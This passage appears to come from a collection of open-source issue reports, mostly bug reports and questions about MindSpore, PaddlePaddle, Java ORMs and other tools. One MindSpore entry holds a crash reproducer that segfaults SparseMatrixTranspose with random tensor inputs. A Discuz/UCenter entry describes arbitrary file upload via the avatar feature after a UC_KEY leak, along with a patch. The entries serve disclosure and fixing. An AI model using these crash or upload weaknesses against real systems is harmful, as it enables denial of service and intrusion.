&lt;&lt; pfalse_rfalse &lt;&lt; std::endl; double precise = 0; if (ptrue_rtrue + ptrue_rfalse != 0) { precise = ptrue_rtrue / (ptrue_rtrue + ptrue_rfalse); std::cout &lt;&lt; ""precise: "" &lt;&lt; precise &lt;&lt; std::endl; } else { std::cout &lt;&lt; ""precise: "" &lt;&lt; ""NA"" &lt;&lt; std::endl; } double recall = 0; if (ptrue_rtrue + pfalse_rtrue != 0) { recall = ptrue_rtrue / (ptrue_rtrue + pfalse_rtrue); std::cout &lt;&lt; ""recall: "" &lt;&lt; recall &lt;&lt; std::endl; } else { std::cout &lt;&lt; ""recall: "" &lt;&lt; ""NA"" &lt;&lt; std::endl; } double Fsocre = 0; if (precise + recall != 0) { Fsocre = 2 * (precise * recall) / (precise + recall); std::cout &lt;&lt; ""Fsocre: "" &lt;&lt; Fsocre &lt;&lt; std::endl; } else { std::cout &lt;&lt; ""Fsocre: "" &lt;&lt; ""NA"" &lt;&lt; std::endl; } } } // namespace easypr"
像IsDeleted和UnitOfWork等等能否提供全局的字段配置，而不是需要去粘贴代码？,比如   <code>: Config.UnitOfWork=true; //全局开启工作单元 Config.IsDeleted=true;//全局开启软删除，而不是把代码粘贴过来？
CTCLoss 算子 GPU 与Ascend 平台不一致,"CTCLoss 算子 GPU 与Ascend 平台不一致 / 硬件环境: /device ascend/GPU/等其他芯片 : -- MindSpore version :1.5.1 -- Python version :3.7.5 -- OS platform and distribution :Ubuntu 18.04 -- GCC/Compiler version : 7.5.0 (/): /mode graph 在昇腾机器执行以上用例 device=""GPU""，在GPU机器执行以上用例 比较结果 GPU： 请问结果不一致现象是预期结果还是bug   <code>: from tkinter import NE import numpy as np import mindspore.nn as nn import mindspore.context as context import mindspore from mindspore import Tensor from mindspore.ops import operations as P import mindspore.ops.composite as C from mindspore.ops.functional import grad context.set_context(mode=context.GRAPH_MODE, device_target=""Ascend"") class Net(nn.Cell): def __init__(self): super(Net, self).__init__() self.add = P.CTCLoss() def construct(self, x, y, m, n): return self.add(x, y, m, n) def test_grad_ctc(): x = Tensor(np.array([[[0.5, 0.4], [0.3, 0.8]]]).astype(np.float32)) labels_indices = Tensor(np.array([[0, 1], [1, 1]]), mindspore.int64) labels_values = Tensor(np.array([1, 0]), mindspore.int32) sequence_length = Tensor(np.array([1, 1]), mindspore.int32) net = Net() loss, gradient = net(x, labels_indices, labels_values, sequence_length) print(loss) test_grad_ctc()"
How to concatenate multiple sequence data in Paddlepaddle? ,"Suppose I have 2 sequential layer output, say seq1 = [a1, a2, a3] and seq2 = [b1, b2, b3], both of which have synchronized time steps (the example has 3 time steps). How to union seq1 and seq2 into one sequence S = [(a1, b1), (a2, b2), (a3, b3)] as input to next sequence layer? data_1 and data_2 has synchronized time steps and provided by one reader Should add some extra operation or below code is OK?   <code>: data_seq1 = paddle.layer.data(""data_1"",paddle.data_type.dense_vector_sequence(3)) data_seq2 = paddle.layer.data(""data_2"",paddle.data_type.integer_value_sequence(100)) L1 = paddle.layer.lstmemory(input=data_seq1 , act=relu, bias_attr=bias_attr) L2 = paddle.layer.lstmemory(input=data_seq2 , act=relu, bias_attr=bias_attr) L3 = paddle.layer.lstmemory(input=[L1,L2], act=relu, bias_attr=bias_attr)"
分页查询逻辑删除问题,版本：3.0.1 数据库 mysql8.0 问题： 普通分页查询，生成的sql逻辑删除有问题， 我打了断点跟踪到这里 如下： 但是结果集是对的，很奇怪 这个问题我试过很多地方，有的地方出现有的地方没有，看上去也没啥规律，目前使用起来没问题，不知道对其他有没有什么影响   <code>: com.baomidou.mybatisplus.extension.plugins.PaginationInterceptor#intercept
[CT][MS][CI]Fatal Python error: Segmentation fault,": /device gpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_probability_lognormal.py pass   <code>: ckAllocSize] Memory not enough: current free memory size[3538944] is smaller than required size[102760448]. [ERROR] RUNTIME_FRAMEWORK(56501,7f075326a700,python):2021-07-13-17:25:58.259.184 [mindspore/ccsrc/runtime/framework/actor/memory_manager_actor.cc:41] AllocateMemory] Device(id:0) memory isn't enough and alloc failed, actor name: Default/b-LogNormal/Log-op4903, alloc size: 102760448 [ERROR] VM(56501,7f07dff0f740,python):2021-07-13-17:25:58.259.257 [mindspore/ccsrc/vm/backend.cc:814] RunGraph] The actor runs failed, actor name: kernel_graph_30 [INFO] DEBUG(56501,7f07dff0f740,python):2021-07-13-17:25:58.259.285 [mindspore/ccsrc/debug/trace.cc:115] TraceGraphEval] Length of analysis graph stack is empty. [INFO] DEBUG(56501,7f07dff0f740,python):2021-07-13-17:25:58.259.311 [mindspore/ccsrc/debug/trace.cc:445] GetEvalStackInfo] Get graph analysis information begin [ERROR] RUNTIME_FRAMEWORK(56501,7f074ba67700,python):2021-07-13-17:25:58.259.335 [mindspore/ccsrc/runtime/framework/actor/kernel_actor.cc:461] EraseInput] Erase input data failed: Default/b-LogNormal/LessEqual-op4904, sequential_num: 0 [INFO] DEBUG(56501,7f07dff0f740,python):2021-07-13-17:25:58.259.345 [mindspore/ccsrc/debug/trace.cc:448] GetEvalStackInfo] Length of analysis information stack is empty. [WARNING] PRE_ACT(56501,7f075326a700,python):2021-07-13-17:25:58.259.289 [mindspore/ccsrc/backend/optimizer/mem_reuse/mem_dynamic_allocator.cc:146] CalMemBlockAllocSize] Memory not enough: current free memory size[3538944] is smaller than required size[102760448]. [ERROR] RUNTIME_FRAMEWORK(56501,7f075326a700,python):2021-07-13-17:25:58.259.393 [mindspore/ccsrc/runtime/framework/actor/memory_manager_actor.cc:41] AllocateMemory] Device(id:0) memory isn't enough and alloc failed, actor name: Default/b-LogNormal/Select-op4905, alloc size: 102760448 Fatal Python error: Segmentation fault Thread 0x00007f07dff0f740 (most recent call first): File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 622 in _exec_pip File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 75 in wrapper File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 639 in run File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 611 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 660 in compile_and_run File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 386 in __call__ File ""/home/wty/MindSporeTest/probability/probability_lognormal.py"", line 343 in run_case_lognormal_prod"
Fluid's vgg16 doesn't converge now.,"We need https://github.com/PaddlePaddle/Paddle/pull/9002 to guarantee this. Script from https://github.com/dzhwinter/benchmark   <code>: Pass = 1, Training performance = 240.092875 imgs/s, Train accuracy = 0.099440, Test accuracy = 0.100400 Pass = 2, Training performance = 240.027211 imgs/s, Train accuracy = 0.099540, Test accuracy = 0.100000 Pass = 3, Training performance = 240.151129 imgs/s, Train accuracy = 0.099580, Test accuracy = 0.100100 Pass = 4, Training performance = 240.201239 imgs/s, Train accuracy = 0.099760, Test accuracy = 0.094900 Pass = 5, Training performance = 240.154561 imgs/s, Train accuracy = 0.098660, Test accuracy = 0.100000 Pass = 6, Training performance = 240.091699 imgs/s, Train accuracy = 0.099620, Test accuracy = 0.100000 Pass = 7, Training performance = 240.322419 imgs/s, Train accuracy = 0.097080, Test accuracy = 0.100000 Pass = 8, Training performance = 239.932700 imgs/s, Train accuracy = 0.098200, Test accuracy = 0.100300 Pass = 9, Training performance = 239.198880 imgs/s, Train accuracy = 0.099780, Test accuracy = 0.099800 Pass = 10, Training performance = 240.219263 imgs/s, Train accuracy = 0.098220, Test accuracy = 0.100000"
Run Python OP tests in a single Python process to improve test time.,"Currently, our tests run with 2 GPUs, the init time is absurdly long: about 4s for each process. Currently, we run each OP test on different processes. This PR: create cmake function which will generate the Makefile that runs a list of Python unittest module in a single Python process. move all ""python unittest compatible"" (e.g., used the package, not just a regular python file). from to . cmake now will run all OP tests in in a single process, except the time-consuming tests, they are separated into different processes to utilize parallelism. Please make sure to use the package if you put the python test file in remove all from , is used to disable unittest, we can not do it when running all tests in a single process since it will terminate the process without running the other tests. Instead, the test is disabled in . FIXME is added for each disabled item. Please disable the unittest from , instead of adding to the Python file, for all Python file in .   <code>: py_test_modules unittest fluid/tests fluid/tests/unittests fluid/tests/unittests unittest fluid/tests/unittests exit(0) fluid/tests/unittests/*.py exit(0) fluid/tests/unittests/CMakeLists.txt fluid/tests/unittests/CMakeLists.txt exit(0) fluid/tests/unittests/"
是否支持json 数组的查询,"表结构是： CREATE TABLE ( varchar(16) DEFAULT NULL, json DEFAULT NULL ) ENGINE=InnoDB DEFAULT CHARSET=utf8 如果插入的数组是[""选项一"",""选项二"",""选项三""]，可以通过 ""t_json&lt;&gt;"":""选项二"" 查询出来。 但是插入的数组是 [{""empName"": ""张三"",""id"": ""201507692028""},{""empName"": ""李四"",""id"": ""201507692029""}]，我通过条件 ""t_json&lt;&gt;"":""张三"" 就查询不出来了。 请教一下，是我的用法有问题，还是apijson 不支持呢？   <code>: json_test id t_json"
复合主键在FetchSql和其他Fetch操作中暂时不支持，是否有支持的计划？,异常如下：   <code>: org.beetl.sql.clazz.kit.BeetlSQLException: org.beetl.sql.clazz.kit.BeetlSQLException: java.lang.UnsupportedOperationException: 不支持多主键 at org.beetl.sql.fetch.DefaultBeanFetch.fetchMore(DefaultBeanFetch.java:60) at org.beetl.sql.core.BaseSQLExecutor.afterBean(BaseSQLExecutor.java:1172) at org.beetl.sql.core.BaseSQLExecutor.select(BaseSQLExecutor.java:177) at org.beetl.sql.core.BaseSQLExecutor.select(BaseSQLExecutor.java:114) at org.beetl.sql.core.SQLManager.pageQuery(SQLManager.java:461) at org.beetl.sql.mapper.identity.PageRMI.call(PageRMI.java:25) at org.beetl.sql.mapper.MapperJavaProxy.invoke(MapperJavaProxy.java:140) at org.beetl.sql.mapper.MapperJava8Proxy.invoke(MapperJava8Proxy.java:90) at com.sun.proxy.$Proxy217.orderPageQuery(Unknown Source)
定时任务有时不生效,"1秒执行一次 有时成功有时失败 在JobInvokeUtil的invokeMethod方法加了断点，发现失败的情况下根本没有进到这个方法里面，不知道为什么会出现这个方法报错的问题   <code>: @Component(""authTask"") public class AuthTask { public static final Logger log = LoggerFactory.getLogger(AuthRask.class); public void updateCode(){ log.info(""=============定时任务====================""); } }"
[CT][MS][switch_layer+D]  index is negative， testcases failed,": Ascend : -- MindSpore version : vm+graph -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_parser_switch_layer_pos_i_exceed index超出最大分支没有报错   <code>: def test_parser_switch_layer_neg_i(): func1 = TwoLayerReLU() func2 = TwoLayerSoftmax() funcs = (func1, func2) net = FinalNet(funcs) inputs = Tensor(np.random.randn(2, 3, 4, 5).astype(np.float32)) i = Tensor(-2, mstype.int32) netout = net(i, inputs) goodout = func1(inputs) allclose_nparray(goodout.asnumpy(), netout.asnumpy(), 0, 0) # test backward grad = Tensor(np.random.randn(2, 3, 4, 5).astype(np.float32)) back_net = GradOfAllInputs(net) back_net_good = GradOfAllInputs(func1) back_out = back_net(i, inputs, grad) back_out_good = back_net_good(inputs, grad) allclose_nparray(back_out[1].asnumpy(), back_out_good[0].asnumpy(), 0, 0) i = Tensor(-2, mstype.int32) netout = net(i, inputs) goodout = func1(inputs) &gt; allclose_nparray(goodout.asnumpy(), netout.asnumpy(), 0.001, 0.001) test_parser_switch_layer.py:201: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/utils.py:28: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[ 0. , 0. , 0. , -0.27369225, -0.6285993 ], [-0.9503683 , -0.158446... 0. ], [-0.03184016, 0. , 0. , -0.43730173, 0. ]]]], dtype=float32) data_me = array([[[[-0.08967918, -0.04440796, -0.19131155, -0.27806592, -0.39653537], [-0.25120842, -0.113790... -0.13482642], [-0.25962946, -0.17273334, -0.08449277, -0.3894428 , -0.09370161]]]], dtype=float32)"
Allow cache_admin tool to connect to a server work without specifying the port,"Task MindCon极客周 Task Description I find this request questionable, please do NOT start working on it Cache is a new feature of Mindspore to speed up its data processing pipeline by allowing the user to access the dataset in their local memory instead of disk. We have a standalone cache server, which communicates to the cache client use gRPC and performs data transmission. The cache server itself is a binary called cache_server in the MindData build directory, and we have a command-line tool called to startup and shutdown the . By default, after , a listening on default port 50052 is created and the would try to connect to the server with port 50052. For example, if the user does , the with default port 50052 will be shutdown. Right now we can support multiple cache servers running on a single machine (although it's not recommended), as long as each cache server is listening on a unique port. Therefore, if the user wants to start another server listening on another port, he is able to do so via . As a result, he gets two currently-running in total on a single machine, and if he tries , he will be able to see the two processes. With two running on a single machine, if the user wants to stop the with the default port 50052, it's easy and he can just do . However, if he wants to stop the with port 50053, he needs to specify the port in his stop command via . So the request is, can we allow the user to only do (no need to specify the port) even when there are two running, and we somehow magically know which is the one he actually wants to stop? Task Goal Allow cache_admin tool to work without specifying the port Sub Task No. Task Description Issue ID 1 Do you think this request is reasonable 2 Give me a way to achieve this   <code>: cache_admin cache_server cache_admin --start cache_server cache_admin cache_admin --stop cache_server cache_admin --start --port 50053 cache_server ps -ef |grep cache_server cache_server cache_server cache_server cache_admin --stop cache_server cache_admin --stop --port 50053 cache_admin --stop cache_server cache_server"
"Delete the detection_output_op, which had been split into several operators",Now the is in https://github.com/PaddlePaddle/Paddle/blob/develop/python/paddle/fluid/layers/detection.py#L46   <code>: detection_output
MacOS使用1.8.0版本，可以启动，可以显示手机列表，双击连接时报错,"可以显示手机列表，双击连接，输出错误日志： 我自己手动下载命令，是可以正常启动画面映射到MacOS的。   <code>: start server... AdbProcess::out:/Applications/QtScrcpy.app/Contents/MacOS/scrcpy-server: 1 file pushed, 0 skipped. 127.5 MB/s (40067 bytes in 0.000s) AdbProcess::out:[server] ERROR: Exception on thread Thread[main,5,main] AdbProcess::out: AdbProcess::error:java.lang.IllegalArgumentException: '=' expected at com.genymobile.scrcpy.CodecOption.parseOption(CodecOption.java:72) at com.genymobile.scrcpy.CodecOption.parse(CodecOption.java:63) at com.genymobile.scrcpy.Server.createOptions(Server.java:223) at com.genymobile.scrcpy.Server.main(Server.java:305) at com.android.internal.os.RuntimeInit.nativeFinishInit(Native Method) at com.android.internal.os.RuntimeInit.main(RuntimeInit.java:359) scrcpy"
模型构建中关于使用layers.argmax()后模型报错,"1）PaddlePaddle版本：1.5.0 2）CPU： 3）GPU： 4）系统环境：windows 模型信息 问题描述： 如上定义好模型（用了argmax()）后，然后定义目标函数和优化函数，在进入到 optimizer.minimize(cost, parameter_list=self.model.get_actor_params())时系统报错： Process finished with exit code -1073741819 (0xC0000005) 请问：对于argmax()梯度反向传播的问题，是不是不能这么定义网络？   <code>: class ActorModel(Model): def __init__(self, act_dim): hid1_size = 400 hid2_size = 300 self.fc1 = layers.fc(size=hid1_size, act='relu') self.fc2 = layers.fc(size=hid2_size, act='relu') self.fc3 = layers.fc(size=act_dim, act='tanh') def policy(self, obs): hid1 = self.fc1(obs) hid2 = self.fc2(hid1) means = self.fc3(hid2) means = layers.argmax(means, axis=1) means = layers.unsqueeze(means, axes=[1]) return means.astype('float32') cost = layers.reduce_mean(-1.0 * Q) optimizer = fluid.optimizer.AdamOptimizer(self.actor_lr) optimizer.minimize(cost, parameter_list=self.model.get_actor_params())"
excel 导入 数据流 没有关闭,"public ExcelImportResult importExcelByIs(InputStream inputstream, Class&lt;?&gt; pojoClass, ImportParams params, boolean needMore) throws Exception { if (LOGGER.isDebugEnabled()) { LOGGER.debug(""Excel import start ,class is {}"", pojoClass); } List result = new ArrayList(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] buffer = new byte[1024]; int len; while ((len = inputstream.read(buffer)) &gt; -1) { baos.write(buffer, 0, len); } baos.flush(); inputstream userIs 流没有关闭，而且如果出现异常，baos 也会导致不会关闭   <code>: **InputStream userIs** = new ByteArrayInputStream(baos.toByteArray()); if (LOGGER.isDebugEnabled()) { LOGGER.debug(""Excel clone success""); } Workbook book = WorkbookFactory.create(userIs); boolean isXSSFWorkbook = !(book instanceof HSSFWorkbook); if (LOGGER.isDebugEnabled()) { LOGGER.debug(""Workbook create success""); } ExcelImportResult importResult = new ExcelImportResult(); createErrorCellStyle(book); Map&lt;String, PictureData&gt; pictures; for (int i = params.getStartSheetIndex(); i &lt; params.getStartSheetIndex() + params.getSheetNum(); i++) { if (LOGGER.isDebugEnabled()) { LOGGER.debug("" start to read excel by is ,startTime is {}"", System.currentTimeMillis()); } if (isXSSFWorkbook) { pictures = PoiPublicUtil.getSheetPictrues07((XSSFSheet) book.getSheetAt(i), (XSSFWorkbook) book); } else { pictures = PoiPublicUtil.getSheetPictrues03((HSSFSheet) book.getSheetAt(i), (HSSFWorkbook) book); } if (LOGGER.isDebugEnabled()) { LOGGER.debug("" end to read excel by is ,endTime is {}"", System.currentTimeMillis()); } result.addAll(importExcel(result, book.getSheetAt(i), pojoClass, params, pictures)); if (LOGGER.isDebugEnabled()) { LOGGER.debug("" end to read excel list by sheet ,endTime is {}"", System.currentTimeMillis()); } if (params.isReadSingleCell()) { readSingleCell(importResult, book.getSheetAt(i), params); if (LOGGER.isDebugEnabled()) { LOGGER.debug("" read Key-Value ,endTime is {}"", System.currentTimeMillis()); } } } if (params.isNeedSave()) { saveThisExcel(params, pojoClass, isXSSFWorkbook, book); } importResult.setList(result); if (needMore) { InputStream successIs = new ByteArrayInputStream(baos.toByteArray()); Workbook successBook = WorkbookFactory.create(successIs); importResult.setWorkbook(removeSuperfluousRows(successBook, failRow, params)); importResult.setFailWorkbook(removeSuperfluousRows(book, successRow, params)); importResult.setFailList(failCollection); importResult.setVerfiyFail(verfiyFail); successIs.close(); } ** baos.close();** return importResult; }"
vxe-input 组件 type=date 希望 valueformat 支持 timestamp,"使用日期组件的时候为了避免时区的问题，通常会使用 timestamp 作为值；现在只能用框架定义的日期格式化，没有格式化为timestamp 的方法 请填重在线链接： ？ 请填写期望的结果： 组件的输入输出是 timestamp 类型 OS: ？ Browser: ？ vue: ？ vxe-table: ？   <code>: &lt;vxe-input v-model=""row.date12"" value-format=""timestamp"" type=""date"" placeholder=""请选择日期"" transfer /&gt;"
Construct backward pass in Program/BlockDesc,"Currently, we have a function named which creates C++ operator instances that compose the backward pass. However, as we decided to separate compilation from execution, we need to make operate the ProgramDesc, BlockDesc, and OpDesc, instead of creating the runtime representation of the backward pass. Related PR: https://github.com/PaddlePaddle/Paddle/pull/4517   <code>: Backward Backward"
自己项目结合@RepeatSubmit 无效,"将若依的防重复提交结合到自己的项目里,无效.具体原因是 每次 Object sessionObj = session.getAttribute(SESSION_REPEAT_KEY);都是Null.点一次提交,间隔1秒再点,都是null,没存进session.不知道为什么.   <code>: public boolean isRepeatSubmit(HttpServletRequest request, RepeatSubmit annotation) throws Exception { // 本次参数及系统时间 String nowParams = JSON.marshal(request.getParameterMap()); Map&lt;String, Object&gt; nowDataMap = new HashMap&lt;&gt;(2); nowDataMap.put(REPEAT_PARAMS, nowParams); nowDataMap.put(REPEAT_TIME, System.currentTimeMillis()); // 请求地址（作为存放session的key值） String url = request.getRequestURI(); HttpSession session = request.getSession(); Object sessionObj = session.getAttribute(SESSION_REPEAT_KEY); if (sessionObj != null) { Map&lt;String, Object&gt; sessionMap = (Map&lt;String, Object&gt;) sessionObj; if (sessionMap.containsKey(url)) { Map&lt;String, Object&gt; preDataMap = (Map&lt;String, Object&gt;) sessionMap.get(url); if (compareParams(nowDataMap, preDataMap) &amp;&amp; compareTime(nowDataMap, preDataMap, annotation.interval())) { return true; } } } Map&lt;String, Object&gt; sessionMap = new HashMap&lt;&gt;(1); sessionMap.put(url, nowDataMap); session.setAttribute(SESSION_REPEAT_KEY, sessionMap); return false; }"
使用vs2022preivew创建项目，添加furion之后addinject报空指针,"Furion 版本号 哪个版本号？ 3.7.4 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 发生了什么？ 使用vs2022 preview新建项目，选择ASP.NET CORE WEB项目，框架使用.netcore 6.0，不使用https,don't use top-level statements选上勾 。 然后在生成的program代码中添加 builder.Services.AddControllers().AddInject(); ...... app.UseInject(); 运行项目报错. 异常堆栈是什么？ System.TypeInitializationException:“The type initializer for 'Furion.App' threw an exception.” 在 Furion.App.get_Settings() 在 Microsoft.Extensions.DependencyInjection.SpecificationDocumentServiceCollectionExtensions.AddSpecificationDocuments(IServiceCollection services, Action1 configure) 在 Microsoft.Extensions.DependencyInjection.AppServiceCollectionExtensions.AddInject(IMvcBuilder mvcBuilder, Action`1 configure) 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则不予处理。 http://www.sdpbl.com/err/XinXiShouJi.zip 无数据库 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 期待的结果是？ 不报错   <code>: 1 configure) 在 Microsoft.Extensions.DependencyInjection.AppServiceCollectionExtensions.AddInject(IServiceCollection services, Action"
`mindspore.ops.operations.sparse_ops.SparseMatrixTranspose` can trigger segfault,"can trigger segfault which can lead to security problem and at least attacker can do denial-of-service attack. / 硬件环境: Not related. : -- MindSpore version : 1.9.0 -- Python version : 3.8.10 -- OS platform and distribution : Not related -- GCC/Compiler version : Not related (/): /mode pynative /mode graph Here is the exp: Just run the exp mentioned above. At least it cannot be segfault. If the testcase is not allowed, it should raise exceptions, rather than segfault (maybe memory errors or some other security problems).   <code>: mindspore.ops.operations.sparse_ops.SparseMatrixTranspose import numpy as np import mindspore as ms from mindspore.ops.operations.sparse_ops import SparseMatrixTranspose SparseMatrixTranspose()( ms.Tensor(np.random.uniform(-2147483648, 2147483647, []).astype(np.int32)), ms.Tensor(np.random.uniform(-2147483648, 2147483647, [4]).astype(np.int32)), ms.Tensor(np.random.uniform(-2147483648, 2147483647, [8, 1]).astype(np.int32)), ms.Tensor(np.random.uniform(-2147483648, 2147483647, []).astype(np.int32)), ms.Tensor(np.random.uniform(-9223372036854775808, 9223372036854775807, []).astype(np.uint64)) ) $ python3 exp.py [1] 2854 segmentation fault python3 exp.py"
微服务间调用日期格式转换错误,"没改包名之前是正常的，改了包名之后，调用就报日期格式转换错误，我想知道哪里有配置全局日期格式化的 环境信息 pigx版本: 4.0 是否修改包名: 是 提供详细 JSON parse error: Cannot deserialize value of type from String ""2021-01-07T14:25:40"": Failed to deserialize java.time.LocalDateTime(java.time.format.DateTimeParseException) Text '2021-01-07T14:25:40' could not be parsed at index 10;   <code>: java.time.LocalDateTime"
[ST][MS][Resnet50]函数式编程resnet50 在feed模式下cifar10 精度只有53%,"函数式编程resnet50 ascend 8p 在feed模式下cifar10 精度只有53% / 硬件环境: /device ascend : -- MindSpore version :commit_id = '[sha1]:738a59a0,[branch]:(HEAD,origin/master,origin/HEAD,master)' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_cell_functional_programming_datasink_001.py cd solution_test/cases/01frame_func/17cell_function_coding/support_data_sinking/resnet/ pytest -s test_ms_cell_functional_programming_datasink_001.py 精度达标 责任人 吕昱峰   <code>: 'lr_end': 1e-05, 'lr_init': 0.01, 'lr_max': 0.1, 'mode_name': 'GRAPH', 'momentum': 0.9, 'net_name': 'resnet50', 'network_dataset': 'resnet50_cifar10', 'optimizer': 'Momentum', 'output_path': '/cache/train', 'parameter_server': False, 'pre_trained': '', 'pretrain_epoch_size': 0, 'result_path': '', 'run_distribute': False, 'run_eval': False, 'save_best_ckpt': True, 'save_checkpoint': True, 'save_checkpoint_epochs': 5, 'save_graphs': False, 'save_graphs_path': './graphs', 'train_image_size': 224, 'train_url': '', 'warmup_epochs': 5, 'weight_decay': 0.0001, 'width': 224} Please check the above information for the configurations result: {'top_1_accuracy': 0.5271434294871795, 'top_5_accuracy': 0.9341947115384616} ckpt= /home/jenkins0/solution_test/cases/01frame_func/17cell_function_coding/feature_coupling_test/train_execute_expression/ResNet_csj/scripts/train_parallel0/resnet50-89.ckpt"
如何有效查看 LoDTensor 的内容？,"比如一个 LODTensor 如下 如何查看 的数据？ 谢谢   <code>: (Pdb) data {'img': &lt;paddle.fluid.core.LoDTensor object at 0x7fbe19ca3c00&gt;, 'label': &lt;paddle.fluid.core.LoDTensor object at 0x7fbe19ca3cc0&gt;} (Pdb) data['img'] &lt;paddle.fluid.core.LoDTensor object at 0x7fbe19ca3c00&gt; data['img']"
2.0.0rc1版本中model.fit()高级API获取张量错误的问题,"在自定义网络中调用model.fit(train_X, epochs=5, batch_size=64, verbose=2)进行训练报错。 The loss value printed in the log is the current step, and the metric is the average value of previous step. Epoch 1/5 ---------------------------------------------------------------------------ValueError Traceback (most recent call last) in 14 model.prepare(optimizer=paddle.optimizer.Adam(parameters=model.parameters()),loss=paddle.nn.CrossEntropyLoss(),metrics=paddle.metric.Accuracy()) 15 ---&gt; 16 model.fit(train_X, epochs=5, batch_size=64, verbose=2) /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/hapi/model.py in fit(self, train_data, eval_data, batch_size, epochs, eval_freq, log_freq, save_dir, save_freq, verbose, drop_last, shuffle, num_workers, callbacks) 1490 for epoch in range(epochs): 1491 cbks.on_epoch_begin(epoch) -&gt; 1492 logs = self._run_one_epoch(train_loader, cbks, 'train') 1493 cbks.on_epoch_end(epoch, logs) 1494 /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/hapi/model.py in _run_one_epoch(self, data_loader, callbacks, mode, logs) 1797 if mode != 'predict': 1798 outs = getattr(self, mode + '_batch')(data[:len(self._inputs)], -&gt; 1799 data[len(self._inputs):]) 1800 if self._metrics and self._loss: 1801 metrics = [[l[0] for l in outs[0]]] /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/hapi/model.py in train_batch(self, inputs, labels) 938 print(loss) 939 """""" --&gt; 940 loss = self._adapter.train_batch(inputs, labels) 941 if fluid.in_dygraph_mode() and self._input_info is None: 942 self._update_inputs() /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/hapi/model.py in train_batch(self, inputs, labels) 652 else: 653 outputs = self.model.network.forward( --&gt; 654 * [to_variable(x) for x in inputs]) 655 656 losses = self.model._loss(*(to_list(outputs) + labels)) /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dygraph/container.py in forward(self, input) 84 def forward(self, input): 85 for layer in self._sub_layers.values(): ---&gt; 86 input = layer(input) 87 return input 88 /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dygraph/layers.py in call(self, *inputs, **kwargs) 882 self._built = True 883 --&gt; 884 outputs = self.forward(*inputs, **kwargs) 885 886 for forward_post_hook in self._forward_post_hooks.values(): /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/nn/layer/rnn.py in forward(self, inputs, initial_states, sequence_length) 1033 if self.could_use_cudnn: 1034 # Add CPU kernel and dispatch in backend later -&gt; 1035 return self._cudnn_impl(inputs, initial_states, sequence_length) 1036 1037 states = split_states(initial_states, self.num_directions == 2, /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/nn/layer/rnn.py in _cudnn_impl(self, inputs, initial_states, sequence_length) 977 def _cudnn_impl(self, inputs, initial_states, sequence_length): 978 if not self.time_major: --&gt; 979 inputs = paddle.tensor.transpose(inputs, [1, 0, 2]) 980 out = self._helper.create_variable_for_type_inference(inputs.dtype) 981 state = [ /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/layers/nn.py in transpose(x, perm, name) 5469 """""" 5470 if in_dygraph_mode(): -&gt; 5471 out, _ = core.ops.transpose2(x, 'axis', perm) 5472 return out 5473 ValueError: (InvalidArgument) The input tensor's dimension should be equal to the axis's size. But received input tensor's dimension is 2, axis's size is 3 [Hint: Expected x_rank == axis_size, but received x_rank:2 != axis_size:3.] (at /paddle/paddle/fluid/operators/transpose_op.cc:47) [Hint: If you need C++ stacktraces for debugging, please set .] [operator &lt; transpose2 &gt; error] 附张量类形状 (965, 1, 6)   <code>: FLAGS_call_stack_level=2"
UC_KEY泄露后，头像功能有可能被用于上传任意文件,"UC_KEY泄露后，头像功能有可能被用于上传任意文件 uc_server/model/base.php 找到 下边加 uc_server/model/pm.php 找到 修改为   <code>: function input($k) { if($k == 'uid'){ if(is_array($this-&gt;input[$k])){ foreach($this-&gt;input[$k] as $value){ if(!preg_match(""/^[0-9]+$/"", $value)){ return NULL; } } }elseif(!preg_match(""/^[0-9]+$/"", $this-&gt;input[$k])){ return NULL; } } if($uid == $value || !$value) { if($uid == $value || !$value || !preg_match(""/^[0-9]+$/"", $value)) {"
